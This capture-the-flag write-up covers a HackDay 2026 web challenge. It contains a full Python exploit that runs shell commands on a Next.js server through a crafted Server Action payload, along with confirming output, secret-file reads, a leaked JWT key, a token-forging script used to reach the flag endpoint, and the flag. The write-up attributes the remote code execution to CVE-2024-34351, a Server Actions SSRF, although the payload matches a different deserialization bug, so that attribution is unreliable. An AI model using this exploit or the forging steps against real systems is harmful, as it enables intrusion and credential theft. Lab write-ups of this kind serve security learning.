# Trust me I'm authenticated — HackDay 2026

## Background

- Target: `https://fhjhtr10n9.hackday.fr`
- `/flag` gated by HTTP 401, `/terminal` hosted a Next.js “legacy terminal” and nginx/proxying a Go API that returned 404 on port 80.
- Source comment “Last update: 2002” hinted at older auth mechanisms.

## Recon and early dead ends

- `/flag` reliably 401’ed even after trying header-based bypasses (`X-Forwarded-For`, `X-Real-IP`, `X-Client-IP`, `X-Original-URL`) and brute-forcing Basic Auth with `admin:2002`.
- `/terminal` rendered a fake shell; inspecting the bundle reminded me of CVE-2024-34351 (Next.js Server Actions SSRF). A publicly available scanner flagged the app as vulnerable, but the “safe-check” SSRF payload never reached my redirect server and kept throwing 500s.

## CVE-2024-34351 RCE

- Re-running the scanner without the safe-check triggered the RCE test payload. The server responded `303` with `X-Action-Redirect: /login?a=11111;push`, proving arbitrary server-side code execution through the Next.js Server Action.

- Crafted a custom Python exploit that mimicked the scanner’s payload structure by abusing the promise hooks in the form submission. The key part was building `process.mainModule.require('child_process').execSync` and surfacing the result through a `NEXT_REDIRECT` error to force it into the `X-Action-Redirect` header.

```python
import requests, sys, urllib3
urllib3.disable_warnings()

cmd = sys.argv[1] if len(sys.argv) > 1 else "echo $((41*271))"
url = "https://fhjhtr10n9.hackday.fr/terminal"
boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

prefix_payload = (
    f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
    f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
    f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
)

part0 = (
    '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
    '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
    + prefix_payload
    + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
)

payload = (
    f"------{boundary}\r\n"
    f'Content-Disposition: form-data; name="0"\r\n\r\n'
    f"{part0}\r\n"
    f"------{boundary}\r\n"
    f'Content-Disposition: form-data; name="1"\r\n\r\n'
    f'"$@0"\r\n'
    f"------{boundary}\r\n"
    f'Content-Disposition: form-data; name="2"\r\n\r\n'
    f"[]\r\n"
    f"------{boundary}--"
)

headers = {"Next-Action": "x", "Content-Type": f"multipart/form-data; boundary={boundary}"}
resp = requests.post(url, headers=headers, data=payload.encode(), verify=False, allow_redirects=False)
print(resp.status_code, resp.headers.get("X-Action-Redirect"))
```

- Running the script with simple commands confirmed RCE as the `app` user inside `/app`:
  - `python test_rce.py "whoami"` → `X-Action-Redirect: /login?a=app;push`
  - `python test_rce.py "pwd"` → `/login?a=/app;push`
  - `python test_rce.py "id"` → `/login?a=uid=100(app) gid=101(app) groups=101(app);push`

## Taming output noise

- Multi-line output (e.g., `ls -la`) caused the redirect header to break and return 500/502. Wrapping commands in `echo $(...)` collapsed whitespace and made the header friendly again:
  - `python test_rce.py 'echo $(ls)'` → redirected with the root `/app` listing.
  - `python test_rce.py 'echo $(ls /)'` → returned the top-level directories.

## Finding secrets

- Enumerating `/app` using the echo trick revealed `.env.development`. Reading it via `echo $(cat .env.development)` exposed:

```
JWT_SECRET_KEY=eZgZQxUmZr9A8HZFPLVjXKh3tWnZBWtF9GAtgmqLdNc=
```

## Forging authentication

- The challenge name (“Trust me I’m authenticated”) and the secret implied JWT-based gating. Using `pyjwt` with the leaked key, I minted tokens with different payloads. The server only verified the signature, so even `{}` worked:

```python
import jwt, requests, urllib3
urllib3.disable_warnings()

secret = "eZgZQxUmZr9A8HZFPLVjXKh3tWnZBWtF9GAtgmqLdNc="
token = jwt.encode({}, secret, algorithm="HS256")
resp = requests.get("https://fhjhtr10n9.hackday.fr/flag", headers={"Authorization": f"Bearer {token}"}, verify=False)
print(resp.status_code)
print(resp.text.splitlines()[1])
```

- Requesting `/flag` with the forged bearer token returned the flag page in plain HTML.

## Flag

- `HACKDAY{220d51b50ba176090af032df28c309547db1f2a445eb2a0740746b61356e683f}`
